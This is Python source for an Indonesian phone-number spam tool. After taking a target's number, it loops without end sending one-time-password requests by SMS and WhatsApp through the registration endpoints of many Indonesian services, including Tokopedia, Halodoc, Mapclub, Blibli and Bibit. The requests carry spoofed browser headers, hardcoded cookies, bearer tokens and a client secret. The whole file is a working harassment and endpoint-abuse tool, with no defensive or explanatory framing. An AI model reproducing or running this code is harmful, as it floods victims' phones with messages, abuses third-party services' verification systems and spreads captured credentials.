                  lamudi=requests.post("https://www.lamudi.co.id/check-mobile-number", headers = {"Host": "www.lamudi.co.id","content-length": "81","origin": "https://www.lamudi.co.id","x-requested-with": "XMLHttpRequest","accept-language": "in","user-agent": freya,"content-type": "application/json","accept": "*/*","referer": "https://www.lamudi.co.id/login","accept-encoding": "gzip, deflate, br","cookie": "eid=id_1796219902623067; PHPSESSID_lamudi=5be4518db440175ccd2a3647a7a7f5d4; device_view=mobile; _fbp=fb.2.1713008792473.236479905; _tt_enable_cookie=1; _ttp=dw6HJddmpIqIb8kbU0xDLwDD-ds; _gcl_au=1.1.396234533.1713008796; _gid=GA1.3.161127650.1713008797; _ce.clock_event=1; _ce.clock_data=-282%2C182.2.41.17%2C2%2C9716d0f82c9071d98aa14503c66d8aac; userLanguage=in; sid=id_1796277592926545; _ce.irv=returning; cebs=1; reese84=3:qel9sM/KiYY+kMHmaZ9WBA==:GJ9cj9F8iScYdBKRo7eivbMU1+K6LjDJxB59lM6HtrqFxEth9RcvIRK2/itdVDwFWTLemZB8YegfUQw7nBjazSPab10xd9maHasv3QvDqubOooRNi5/91nb8u0GrCYv/PzJD9jUH9xfK1xm248qRWxYIO4Q/p3tD/x5PK59pR/us+DadVRn4f7v21A5g1fUWzX45+nBDR6ZmjAEHjhZJn+21Sw7RB/PA/eM0sNUaW87Qbx6clbwNZaICaNVYJA+vxc2JDD01FuFJ3WPa2yjq8LkJz2tCPgQRKTujwYEH6tByHTYK9vA8ar04pU9HGlqSsQAF115JTrIM32lOkmB6JeNudz6gJdRWBps6Hz+MIwynqGhf3xlnkhz81FANpCFGsNgRSdS7UjAkLTM5zLSM4qqbr+FU5O7QvoJ3FNBR0Mca9bIaksZRbhDWJrqbQhA/Lb7uiXreTRNObsDaoMnyzw==:dRGs/INqlRpFewCmRu1zGE20HSUF94PJuQ2nqogVyF0=; AMP_TOKEN=%24NOT_FOUND; _dc_gtm_UA-48934674-8=1; cebsp_=2; _gat_UA-48934674-8=1; _ga=GA1.3.243764704.1713008795; _ga_X588G3GXB4=GS1.1.1713063807.2.1.1713063838.0.0.0; _ce.s=v~56070e5dbdd0e3372c734e6364d4ac9cf8601848~lcw~1713063872715~lva~1713063807286~vpv~1~v11.fhb~1713008826040~v11.lhb~1713009426561~v11slnt~1713063824227~v11.cs~420167~v11.s~90b48d00-fa0b-11ee-a822-89ce0bd62427~v11.sla~1713063872696~gtrk.la~luyxzztd~lcw~1713063872787",}, data =json.dumps({"contactPhone": "+62"+number,"formType": "register","mobileNumberLogin": True}))
                  mapclub=requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=WHATSAPP", headers = {"Host": "beryllium.mapclub.com","Connection": "keep-alive","Content-Length": "26","Client-Platform": "WEB","Origin": "https://www.mapclub.com","Client-Timestamp": "1713097505164","Authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiJkMDJiYTgyOC0yZDNiLTQ5YjgtODJiYy1hODAxZjU0ZWQzMzgiLCJleHBpcmVkIjoxNzEzMTAxMTA1ODg5LCJleHBpcmUiOjM2MDAsImV4cCI6MTcxMzEwMTEwNSwiaWF0IjoxNzEzMDk3NTA1LCJwbGF0Zm9ybSI6IldFQiJ9.ysu0Tvg5HjkdOBMDCzk67PuH8bld3lJ4dSyzOebkPSpyva9KYEY4xA5y89FTKZ_WTGczNbY7VqiCw5fPpG_VeA","Content-Type": "application/json","Accept-Language": "in-ID","Accept": "application/json, text/plain, */*","User-Agent": freya,"Referer": "https://www.mapclub.com/member/register","Accept-Encoding": "gzip, deflate, br",},data =json.dumps({"account": number}))
                  bantudagang=requests.post("https://app.bantudagang.com/api/auth/request-otp", headers = {"Host": "app.bantudagang.com","Content-Length": "55","Origin": "https://app.bantudagang.com","Authorization": "Bearer","Access-Control-Max-Age": "86400","Content-Type": "application/json","Accept": "application/json, text/plain, */*","Cache-Control": "no-cache","User-Agent": freya,"Referer": "https://app.bantudagang.com/register","Accept-Encoding": "gzip, deflate, br","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","Cookie": "_fbp=fb.1.1713015792899.82897756; _gcl_au=1.1.764924446.1713015794; _ga_HSV4N9N8GW=GS1.1.1713015797.1.1.1713015802.0.0.0; _ga=GA1.2.59243435.1713015797; _gid=GA1.2.515919540.1713015804; _gat_gtag_UA_194308569_1=1",}, data =json.dumps({"phone_number": "62"+number,"from": "registration",}))
                  evermos=requests.post('https://evermos.com/int-client/v3/user-verification/phone-registration', headers = {'Host': 'evermos.com','content-length': '26','origin': 'https://evermos.com','client-device': 'web_mobile','authorization': 'Bearer 8e1254ac2c8e0783402ed1e47764940328a2d0f5','x-forwarded-for': '10.0.84.135','content-type': 'application/json','accept': 'application/json, text/plain, */*','user-agent': freya,'referer': 'https://evermos.com/registration/otp?source_link=GAds_SEM_EV_EVMBrand','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}, data=json.dumps({"phone": "62"+number,}))
                  headhaldoc = {"referer": "https://www.halodoc.com","content-type": "application/json","x-xsrf-token": xsrf['XSRF-TOKEN']}
                  paylodhaldoc = {"phone_number": "+62"+number,"channel": "whatsapp"}
                  cokihaldoc = {"cookie": '_gcl_au=1.1.935637007.1686465186; _gid=GA1.2.1888372629.1686465187; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7={"g":"9ade8176-03c1-dd87-f8d7-c0c3f60f861a","c":1686465187381,"l":1686465187381}; XSRF-TOKEN='+xsrf['XSRF-TOKEN']+'; afUserId=31b1ff72-9c27-4492-a787-7a895c0d422e-p; AF_SYNC=1686465191318; _ga_02NBJNEKVH=GS1.1.1686465187.1.1.1686465223.0.0.0; amp_394863=WECZG4ZhC4dZKUWVGE4Ogh...1h2kii76k.1h2kiiai8.3.0.3; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7={"g":"c13c57ed-4fbf-80d3-7b17-19eb5a8fcedc","e":1686467027367,"c":1686465187365,"l":1686465227367}; _ga=GA1.2.1084460534.1686465187'}
                  response = requests.post("https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests",headers=headhaldoc,data=json.dumps(paylodhaldoc),cookies=cokihaldoc).json()
                  tokoko=requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",headers={'Host':'api-v2.bukuwarung.com','content-length':'198','sec-ch-ua':'"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile':'?0','user-agent': freya,'content-type':'application/json','accept':'application/json, text/plain, */*','x-app-version-code':'5050','x-app-version-name':'android','buku-origin':'tokoko','sec-ch-ua-platform':'"Linux"','origin':'https://web.tokoko.id','sec-fetch-site':'cross-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://web.tokoko.id/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',},data=json.dumps({"action":"LOGIN_OTP","countryCode":"+62","deviceId":"test-1","method":"WA","phone":number,"clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn"})).text
                  site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0'+number+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : freya,'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}).text # tokped api
                  search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1) # tokped
                  sending = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : freya,'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}, data = {'otp_type' : '116','msisdn' : '0'+number,'tk' : search,'email' : '','original_param' : '','user_id' : '','signature' : '',}).text # send requests tokped api
                  bibit=requests.post("https://api.bibit.id/auth/register/phone",headers={'Host':'api.bibit.id','accept':'application/json, text/plain, */*','content-type':'application/json','sec-ch-ua-mobile':'?1','x-platform':'web','user-agent': freya,'sec-ch-ua-platform':'"Android"','origin':'https://app.bibit.id','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://app.bibit.id/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"code":"62","phone":number,"via":"whatsapp","recaptcha_token":"","recaptcha_type":"v3"})).text #bibit api
                  #yoyo = requests.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",headers={"Host": "identity-gateway.oyorooms.com","consumer_host": "https://www.oyorooms.com","accept-language": "id","access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=","User-Agent": freya,"Content-Type": "application/json","accept": "*/*","origin": "https://www.oyorooms.com","referer": "https://www.oyorooms.com/login","Accept-Encoding": "gzip, deflate, br"},data=json.dumps({"phone":f"0"+number,"country_code": "+62","country_iso_code": "ID","nod": "4","send_otp": "true","devise_role": "Consumer_Guest"})).text
                  mapclubsm =requests.post('https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=SMS', headers = {'Host': 'beryllium.mapclub.com','Connection': 'keep-alive','Content-Length': '25','sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"','Client-Platform': 'WEB','Client-Timestamp': '1713281284112','Accept-Language': 'in-ID','sec-ch-ua-mobile': '?1','Authorization': 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiIzNTQ2NzE5Zi1mYTQ4LTRhYzQtODA3NS0yNDkwZTQ0MWRhMDIiLCJleHBpcmVkIjoxNzEzMjg0ODg1OTcyLCJleHBpcmUiOjM2MDAsImV4cCI6MTcxMzI4NDg4NSwiaWF0IjoxNzEzMjgxMjg1LCJwbGF0Zm9ybSI6IldFQiJ9.PWxtczIk-EJtBSXk7egrukhNtXWVxDegSh2E2M21YWbFFtcVY37ZeB5zXFOu0ZcYdoPYtQMZYNHRNquAQXxAZQ','User-Agent': freya,'Content-Type': 'application/json','Accept': 'application/json, text/plain, */*','sec-ch-ua-platform': '"Android"','Origin': 'https://www.mapclub.com','Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://www.mapclub.com/','Accept-Encoding': 'gzip, deflate, br, zstd'}, data =json.dumps({"account": number}))
                  halodocsm=requests.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests', headers = {'Host': 'magneto.api.halodoc.com','content-length': '68','sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"','accept': 'application/json, text/plain, */*','content-type': 'application/json','x-xsrf-token': 'CB1564D5FF349011A4AA0A7C8BD616F7DEC1C90F6F8E1D2413FA071E61B523BDAE13145471EDBFB4D6BCCA850CCF3CA64446','sec-ch-ua-mobile': '?1','user-agent': freya,'sec-ch-ua-platform': '"Android"','origin': 'https://www.halodoc.com','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-encoding': 'gzip, deflate, br, zstd','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cookie': 'XSRF-TOKEN=CB1564D5FF349011A4AA0A7C8BD616F7DEC1C90F6F8E1D2413FA071E61B523BDAE13145471EDBFB4D6BCCA850CCF3CA64446; _gcl_au=1.1.1798951963.1713237568; _ga=GA1.1.2003923935.1713237571; _ga_02NBJNEKVH=GS1.1.1713237570.1.0.1713237571.59.0.0; amp_394863=YkKd1sVJ-B4Yy33Rtcvl6k...1hrielck4.1hriemi7j.1.1.2'}, data =json.dumps({"phone_number": "+62"+number,"channel": "sms","otp_resent": False}))
                  mokasm = requests.post("https://service.mokapos.com/account/v1/verification/phone/send",headers={  "accept": "application/json, text/plain, */*","authorization": "undefined","save-data": "on","user-agent": freya,"content-type": "application/json;charset=UTF-8"},data=json.dumps({"phone_number":f"+62"+number})).text
                  masm=requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent": freya,"origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"account":number})).text
                  dekorsm=requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"Host":"auth.dekoruma.com","save-data":"on","user-agent": freya,"content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNumber":"+62"+number,"platform":"sms"})).text
                  #req3 = requests.post('https://www.alodokter.com/login-with-phone-number', headers={'Host': 'www.alodokter.com','content-length': '33','x-csrf-token': 'UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==','sec-ch-ua-mobile': '?1','user-agent': freya,'content-type': 'application/json','accept': 'application/json','save-data': 'on','origin': 'https://www.alodokter.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.alodokter.com/login-alodokter','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({"user": {"phone": "0"+number}})).text
                  #pizzahut=requests.post('https://api-prod.pizzahut.co.id/customer/v1/customer/register', headers={'Host': 'api-prod.pizzahut.co.id','content-length': '157','x-device-type': 'PC','sec-ch-ua-mobile': '?1','x-platform': 'WEBMOBILE','x-channel': '2','content-type': 'application/json;charset=UTF-8','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','user-agent': freya,'number -lang': 'en','save-data': 'on','x-device-id': 'web','origin': 'https://www.pizzahut.co.id','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.pizzahut.co.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({  "email": "oidjiwa1@gmail.com",  "first_name": "Xenzi",  "last_name": "Wokwokw",  "password": "Aldi++\\/67",  "phone": "0"+number,  "birthday": "2000-01-02"})).text
                  blism=requests.post("https://www.blibli.com/backend/common/users/_request-otp",headers={"Host":"www.blibli.com","content-length":"27","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent": freya,"sec-ch-ua-platform":"Android","origin":"https://www.blibli.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.blibli.com/login?ref=&logonId=0"+number,"accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"username":"0"+number})).text
                  #ha=requests.post("https://pluang.com/api/user/register/send-otp",headers={'Host':'pluang.com','content-length':'112','sec-ch-ua':'"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile':'?1','user-agent': freya,'sec-ch-ua-platform':'Android','content-type':'application/json','accept':'*/*','origin':'https://pluang.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://pluang.com/register','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},cookies={"cookie":"_gcl_au=1.1.634793654.1661960345","cookie":"_ga=GA1.2.217955334.1661960346","cookie":"_gid=GA1.2.1904059940.1661960346","cookie":"_gat_gtag_UA_124743364_3=1","cookie":"_fbp=fb.1.1661960347395.1573571703","cookie":"environment=production","cookie":"language=in","cookie":"WZRK_G=abf62dd1bf5f41edaa930f04872d1884","cookie":"cebs=1","cookie":"_tt_enable_cookie=1","cookie":"_ttp=ef83fe23-1e62-4741-9339-c077fd6d2076","cookie":"WZRK_S_R57-4Z9-9W6Z=%7B%22p%22%3A1%2C%22s%22%3A1661960351%2C%22t%22%3A1661960350%7D","cookie":"cebsp=1","cookie":"_ce.s=v~2dbcd906fa5fb9b378ebbd2642a150297d12fd70~vpv~0~v11slnt~1661960352042","cookie":"_ga_3RX02MCRS0=GS1.1.1661960345.1.1.1661960362.43.0.0","cookie":"_ga_824G2HJWD9=GS1.1.1661960346.1.1.1661960362.0.0.0","cookie":"_ga_EHTZ6P30C7=GS1.1.1661960346.1.1.1661960362.0.0.0","cookie":"_ga_ZXS1PKZ40M=GS1.1.1661960346.1.1.1661960362.0.0.0"},data=json.dumps({"name":"Shshshiskabzbz","email":"oidjiwa1@gmail.com","phone":"0"+number,"csrfToken":"pluangCsrfToken"})).text
                  momobilsm=requests.post("https://api.momobil.id/users/otp/send",headers={"Host":"api.momobil.id","Connection":"keep-alive","Content-Length":"39","sec-ch-ua-mobile":"?1","User-Agent": freya,"sec-ch-ua-platform":"Android","Content-Type":"application/json","Accept":"*/*","Origin":"https://momobil.id","Sec-Fetch-Site":"same-site","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://momobil.id/","Accept-Encoding":"gzip, deflate, br","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"to":"0"+number,"type":"register"})).text
                  #posting=requests.post("https://api.qoala.app/api/registrations",headers={"Host":"api.qoala.app","content-length":"202","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent": freya,"sec-ch-ua-platform":"Android","origin":"https://www.qoala.app","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.qoala.app/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"fullName":"Hsjsnsns","email":"oidjiwa1@gmail.com","phoneNumber":"+62"+number,"identityType":"KTP","nationality":"ID","password":"Abc167@ggwp","passwordConfirmation":"Abc167@ggwp","lang":"id"})).text
                  #last=json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"sms","identity":"+62"+number},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
                  #kum = requests.post("https://graphql-v4.kumparan.com/query",headers={"Host":"graphql-v4.kumparan.com","content-length":"179","accept":"*/*","content-type":"text/plain","env-client":"d52f487fa02230a23dbdc6e5a67545ddc59e4766d0a326d3f4a814b74ecc045e9382fed825b0d75ec7fa16588a50d75d","sec-ch-ua-mobile":"?1","user-agent": freya,"sec-ch-ua-platform":"Android","origin":"https://m.kumparan.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.kumparan.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"operationName":"CreateOTPAndSendSMS","variables":{"phone":number},"query":"mutation CreateOTPAndSendSMS($phone: String!) {\n  CreateOTPAndSendSMS(phone: $phone)\n}\n"})).text
                  #poss = requests.post("https://ua.ctcorpmpc.com/blade-user/api/user/getotp",headers={"Host":"ua.ctcorpmpc.com","Connection":"keep-alive","Content-Length":"148","Blade-Auth":"Bearer 22222","sec-ch-ua-mobile":"?1","Authorization":"Basic c3dvcmQ6c3dvcmRfc2VjcmV0","Content-Type":"application/json;charset=UTF-8","User-Agent": freya,"X-requested-With":"XMLHttpRequest","Tenant-Id":"000000","sec-ch-ua-platform":"Android","Accept":"*/*","Origin":"https://ua.ctcorpmpc.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://ua.ctcorpmpc.com/cas-web/","Accept-Encoding":"gzip, deflate, br","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNo":number,"tplId":"4001001","tms":1662434407722,"requestId":"6e1b8c1c-fe2f-4418-851b-d31af02f0c221662434407722","intlPhoneCode":"62"})).text
                  why=requests.post("https://www.misteraladin.com/api/members/v2/otp/request",headers={'Host':'www.misteraladin.com','content-length':'81','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','accept-language':'id','sec-ch-ua-mobile':'?0','authorization':'Bearer null','content-type':'application/json;charset=UTF-8','accept':'application/json, text/plain, */*','user-agent': freya,'x-platform':'web','sec-ch-ua-platform':'"Linux"','origin':'https://www.misteraladin.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.misteraladin.com/register','accept-encoding':'gzip, deflate, br',},data=json.dumps({"phone_number_country_code":"62","phone_number":number,"type":"register"})).text
                  #poll=requests.post("https://api.myfave.com/api/fave/v3/auth",headers={'Host':'api.myfave.com','Connection':'keep-alive','Content-Length':'26','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','x-user-agent':'Fave-PWA/v1.0.0','content-type':'application/json','sec-ch-ua-mobile':'?1','User-Agent': freya,'sec-ch-ua-platform':'"Android"','Accept':'*/*','Origin':'https://myfave.com','Sec-Fetch-Site':'same-site','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty','Referer':'https://myfave.com/','Accept-Encoding':'gzip, deflate, br','Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"phone":"+62"+number})).text
                  #reqi=requests.post("https://auth.sampingan.co/v1/otp",data=json.dumps({"channel":"WA","country_code":"+62","phone_number":number}),headers={"Host":"auth.sampingan.co","domain-name":"auth-svc","app-auth":"Skip","content-type":"application/json; charset=UTF-8","user-agent": freya,"accept":"application/vnd.full+json","accept":"application/json","content-type":"application/vnd.full+json","content-type":"application/json","app-version":"2.1.2","app-platform":"Android"}).text
                  #pospp=requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers={"Host":"wapi.ruparupa.com","content-length":"120","sec-ch-ua-mobile":"?0","authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYTQyNDMyZDctZjI5NS00Zjk0LTllYTYtZjlkZmM0ZDgwY2RiIiwiaWF0IjoxNjU3MTI0OTQwLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.4j37JW_U6DVynJ0wCxHmVNI8SbpsaeUgqk3SEihJmvs","content-type":"application/json","x-company-name":"odi","accept":"application/json","user-agent": freya,"user-platform":"desktop","x-frontend-type":"desktop","sec-ch-ua-platform":"Linux","origin":"https://www.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"0"+number,"action":"register","channel":"message","email":"oidjiwa1@gmail.com","token":"","customer_id":"0","is_resend":0})).text
                  print(f"{N}[{warna}!{N}] Sukses menggirim spam [ {H}✓ {N}]")
                  time.sleep(3)
                  countdown(30)


    except KeyboardInterrupt:
        pass

def countdown(time_sec):
    while time_sec:
        mins, secs = divmod(time_sec, 60)
        timeformat = '{:02d}:{:02d}'.format(mins,secs)
        print("Countdown: {}".format(timeformat), end='\r')
        time.sleep(1)
        time_sec -= 1

def menu_satuan():
    try:
        print(f"\n {P}1{M}.{P} Call ( Maintenace {R}Api{N} )\n {P}2{M}.{P} Sms\n {P}3{M}.{P} Whatsapp\n {P}0{M}.{P} Kembali")
        suer = input(f'\n {P}[{U}!{P}] Pilih Disini Ya Mas{M} :{H} ')
        if suer == "1":
            os.system("clear");caramel_freya_3();to_a()
        elif suer == "2":
            os.system("clear");caramel_freya_3();to_b()
        elif suer == "3":
            os.system("clear");caramel_freya_3();to_c()
        elif suer == "0":
            os.system("clear");caramel_freya_3();spam_menu()
    except KeyboardInterrupt:
        sys.exit("\nTerminating the script.")

def to_a():
    #try:
        #number = input(f"\n{N}[{warna}?{N}] Nomor {Y}({Ab}Exam:8xxx{Y})={R}⟩{H} ")
        #if number == "83809192307" or number == "882005602526" or number == "85953890866" or number == "85879210750" or number == "89531319589" or number == "85221850807":
            #print(f'\n{M}tidak dapat Melakukan Spam ke PI')
            #time.sleep(4)
        #else:
            #number_list = number.split(" ")
            #for nomor in number_list:
                #while True:
                  #pos=requests.post("https://api.dagangan.com/v2/users/sms", headers = {"Host": "api.dagangan.com", "accept": "application/json", "content-type": "application/json", "content-length": "50", "accept-encoding": "gzip", "user-agent": freya, "x-newrelic-id": "Vg8AVlRVDhAIUVFVAAEGX10="}, json = {"phone": f"0{number}", "otp_method": "missedcall"}).text
                  #print(f"{N}[{warna}!{N}] Sukses menggirim spam [ {H}✓ {N}]")
                  #time.sleep(3)
                  #countdown(30)
                  print(f"{H} Maintenace API {N}")


    #except KeyboardInterrupt:
        #pass

def to_b():
    try:
        number = input(f"\n{N}[{warna}?{N}] Nomor {Y}({Ab}Exam:8xxx{Y})={R}⟩{H} ")
        if number == "83809192307" or number == "882005602526" or number == "85953890866" or number == "85879210750" or number == "89531319589" or number == "85221850807":
            print(f'\n{M}tidak dapat Melakukan Spam ke PI')
            time.sleep(4)
        else:
            number_list = number.split(" ")
            for nomor in number_list:
                while True:
                  #yoyo = requests.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",headers={"Host": "identity-gateway.oyorooms.com","consumer_host": "https://www.oyorooms.com","accept-language": "id","access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=","User-Agent": freya,"Content-Type": "application/json","accept": "*/*","origin": "https://www.oyorooms.com","referer": "https://www.oyorooms.com/login","Accept-Encoding": "gzip, deflate, br"},data=json.dumps({"phone":f"0"+number,"country_code": "+62","country_iso_code": "ID","nod": "4","send_otp": "true","devise_role": "Consumer_Guest"})).text
                  mapclubsm =requests.post('https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=SMS', headers = {'Host': 'beryllium.mapclub.com','Connection': 'keep-alive','Content-Length': '25','sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"','Client-Platform': 'WEB','Client-Timestamp': '1713281284112','Accept-Language': 'in-ID','sec-ch-ua-mobile': '?1','Authorization': 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiIzNTQ2NzE5Zi1mYTQ4LTRhYzQtODA3NS0yNDkwZTQ0MWRhMDIiLCJleHBpcmVkIjoxNzEzMjg0ODg1OTcyLCJleHBpcmUiOjM2MDAsImV4cCI6MTcxMzI4NDg4NSwiaWF0IjoxNzEzMjgxMjg1LCJwbGF0Zm9ybSI6IldFQiJ9.PWxtczIk-EJtBSXk7egrukhNtXWVxDegSh2E2M21YWbFFtcVY37ZeB5zXFOu0ZcYdoPYtQMZYNHRNquAQXxAZQ','User-Agent': freya,'Content-Type': 'application/json','Accept': 'application/json, text/plain, */*','sec-ch-ua-platform': '"Android"','Origin': 'https://www.mapclub.com','Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://www.mapclub.com/','Accept-Encoding': 'gzip, deflate, br, zstd'}, data =json.dumps({"account": number}))
                  halodocsm=requests.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests', headers = {'Host': 'magneto.api.halodoc.com','content-length': '68','sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"','accept': 'application/json, text/plain, */*','content-type': 'application/json','x-xsrf-token': 'CB1564D5FF349011A4AA0A7C8BD616F7DEC1C90F6F8E1D2413FA071E61B523BDAE13145471EDBFB4D6BCCA850CCF3CA64446','sec-ch-ua-mobile': '?1','user-agent': freya,'sec-ch-ua-platform': '"Android"','origin': 'https://www.halodoc.com','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-encoding': 'gzip, deflate, br, zstd','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cookie': 'XSRF-TOKEN=CB1564D5FF349011A4AA0A7C8BD616F7DEC1C90F6F8E1D2413FA071E61B523BDAE13145471EDBFB4D6BCCA850CCF3CA64446; _gcl_au=1.1.1798951963.1713237568; _ga=GA1.1.2003923935.1713237571; _ga_02NBJNEKVH=GS1.1.1713237570.1.0.1713237571.59.0.0; amp_394863=YkKd1sVJ-B4Yy33Rtcvl6k...1hrielck4.1hriemi7j.1.1.2'}, data =json.dumps({"phone_number": "+62"+number,"channel": "sms","otp_resent": False}))
